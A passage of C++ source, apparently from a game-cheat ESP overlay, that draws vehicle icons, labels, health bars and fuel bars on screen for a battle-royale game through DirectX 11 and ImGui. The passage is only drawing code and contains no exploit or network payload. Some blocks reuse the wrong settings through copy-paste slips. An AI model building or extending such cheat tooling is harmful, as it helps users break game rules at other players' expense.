													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 90, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 90, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 90, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 90, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Sports_Color[0], Setting::vahicle_Text_item_Sports_Color[1], Setting::vahicle_Text_item_Sports_Color[2], Setting::vahicle_Text_item_Sports_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Sports_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Dacia && Vehicle.Name == u8"Dacia")
											{
												if (Setting::vahicle_Text_item_Dacia_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Dacia, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Dacia, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 82, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 82, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 82, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 82, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Dacia_Color[0], Setting::vahicle_Text_item_Dacia_Color[1], Setting::vahicle_Text_item_Dacia_Color[2], Setting::vahicle_Text_item_Dacia_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Dacia_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Rony && Vehicle.Name == u8"Rony")
											{
												if (Setting::vahicle_Text_item_Rony_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Rony, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Rony, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 79, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 79, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 79, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 79, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Rony_Color[0], Setting::vahicle_Text_item_Rony_Color[1], Setting::vahicle_Text_item_Rony_Color[2], Setting::vahicle_Text_item_Rony_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Rony_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_UAZ && Vehicle.Name == u8"UAZ")
											{
												if (Setting::vahicle_Text_item_UAZ_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::UAZ, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::UAZ, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 75, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 75, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 75, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 75, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_UAZ_Color[0], Setting::vahicle_Text_item_UAZ_Color[1], Setting::vahicle_Text_item_UAZ_Color[2], Setting::vahicle_Text_item_UAZ_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_UAZ_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Minibus && Vehicle.Name == u8"Minibus")
											{
												if (Setting::vahicle_Text_item_Minibus_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Minibus, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Minibus, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 100, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 100, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 100, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 100, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Minibus_Color[0], Setting::vahicle_Text_item_Minibus_Color[1], Setting::vahicle_Text_item_Minibus_Color[2], Setting::vahicle_Text_item_Minibus_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Minibus_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_PG117 && Vehicle.Name == u8"Ship")
											{
												if (Setting::vahicle_Text_item_PG117_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::PG117, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::PG117, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 125, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 125, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 125, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 125, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_PG117_Color[0], Setting::vahicle_Text_item_PG117_Color[1], Setting::vahicle_Text_item_PG117_Color[2], Setting::vahicle_Text_item_PG117_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_PG117_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Aquarail && Vehicle.Name == u8"Boat")
											{
												if (Setting::vahicle_Text_item_Aquarail_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Aquarail, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Aquarail, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 125, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 125, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 125, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 125, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Aquarail_Color[0], Setting::vahicle_Text_item_Aquarail_Color[1], Setting::vahicle_Text_item_Aquarail_Color[2], Setting::vahicle_Text_item_Aquarail_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Aquarail_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_BigFoot && Vehicle.Name == u8"Monster Truck")
											{
												if (Setting::vahicle_Text_item_BigFoot_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::BigFoot, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::BigFoot, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 145, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 145, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 145, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 145, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_BigFoot_Color[0], Setting::vahicle_Text_item_BigFoot_Color[1], Setting::vahicle_Text_item_BigFoot_Color[2], Setting::vahicle_Text_item_BigFoot_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_BigFoot_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_UTV && Vehicle.Name == u8"UTV")
											{
												if (Setting::vahicle_Text_item_UTV_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::UTV, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::UTV, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 74, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 74, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 74, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 74, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_UTV_Color[0], Setting::vahicle_Text_item_UTV_Color[1], Setting::vahicle_Text_item_UTV_Color[2], Setting::vahicle_Text_item_UTV_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_UTV_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Capsule && Vehicle.Name == u8"Capsule")
											{
												if (Setting::vahicle_Text_item_Capsule_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Capsule, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 80, 5, ImColor(0, 0, 0, 200));
														DX11::ImGui_DX11::DrawImage(DX11::Capsule, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 125, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 125, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 125, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 125, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Capsule_Color[0], Setting::vahicle_Text_item_Capsule_Color[1], Setting::vahicle_Text_item_Capsule_Color[2], Setting::vahicle_Text_item_Capsule_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Capsule_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Coupe && Vehicle.Name == u8"Coupe")
											{
												if (Setting::vahicle_Text_item_Coupe_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Coupe, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Coupe, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 90, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 90, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 90, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 90, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Coupe_Color[0], Setting::vahicle_Text_item_Coupe_Color[1], Setting::vahicle_Text_item_Coupe_Color[2], Setting::vahicle_Text_item_Coupe_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Coupe_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_PickUpTruck && Vehicle.Name == u8"PickUp Truck")
											{
												if (Setting::vahicle_Text_item_PickUpTruck_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::PickUpTruck, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::PickUpTruck, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;
													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 142, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 142, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 142, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 142, 6, Vehicle.oil);
												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_PickUpTruck_Color[0], Setting::vahicle_Text_item_PickUpTruck_Color[1], Setting::vahicle_Text_item_PickUpTruck_Color[2], Setting::vahicle_Text_item_PickUpTruck_Color[3]);
												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_PickUpTruck_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_SnowBike && Vehicle.Name == u8"SnowBike")
											{
												if (Setting::vahicle_Text_item_SnowBike_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::SnowBike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::SnowBike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 115, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 115, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 115, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 115, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_SnowBike_Color[0], Setting::vahicle_Text_item_SnowBike_Color[1], Setting::vahicle_Text_item_SnowBike_Color[2], Setting::vahicle_Text_item_SnowBike_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_SnowBike_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Bike && Vehicle.Name == u8"Bike")
											{
												if (Setting::vahicle_Text_item_Bike_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Bike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Bike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 125, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 125, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 125, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 125, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Bike_Color[0], Setting::vahicle_Text_item_Bike_Color[1], Setting::vahicle_Text_item_Bike_Color[2], Setting::vahicle_Text_item_Bike_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Bike_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_ATV2 && Vehicle.Name == u8"ATV")
											{
												if (Setting::vahicle_Text_item_ATV2_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::ATV2, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::ATV2, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 30, 74, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 74, 6, Vehicle.hp);

												}
												if (Setting::feul)
												{

													DX11::ImGui_DX11::DrawFilledRect(Screen.X - 15, Screen.Y + 18, 74, 6, ImColor(0, 0, 0, 200));
													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 74, 6, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_ATV2_Color[0], Setting::vahicle_Text_item_ATV2_Color[1], Setting::vahicle_Text_item_ATV2_Color[2], Setting::vahicle_Text_item_ATV2_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_ATV2_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}


										}
										else if (VehicleStyle == 1)
										{
											if (Setting::vahicle_Text_item_Plane && Vehicle.Name == u8"Air Plane")
											{

												if (Setting::vahicle_Text_item_Plane_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Plane, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Plane, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_SnowBoard && Vehicle.Name == u8"SnowBoard")
											{

												if (Setting::vahicle_Text_item_SnowBoard_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::SnowBoard, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::SnowBoard, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 80, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Plane_Color[0], Setting::vahicle_Text_item_Plane_Color[1], Setting::vahicle_Text_item_Plane_Color[2], Setting::vahicle_Text_item_Plane_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Plane_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Plane && Vehicle.Name == u8"Helicopter")
											{

												if (Setting::vahicle_Text_item_Helicopter_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Helicopter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Helicopter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 97, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 97.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Plane_Color[0], Setting::vahicle_Text_item_Plane_Color[1], Setting::vahicle_Text_item_Plane_Color[2], Setting::vahicle_Text_item_Plane_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Plane_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_BRDM && Vehicle.Name == u8"BRDM")
											{

												if (Setting::vahicle_Text_item_BRDM_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::BRDM, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::BRDM, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												if (Setting::hp)
												{

													std::string hpveh;


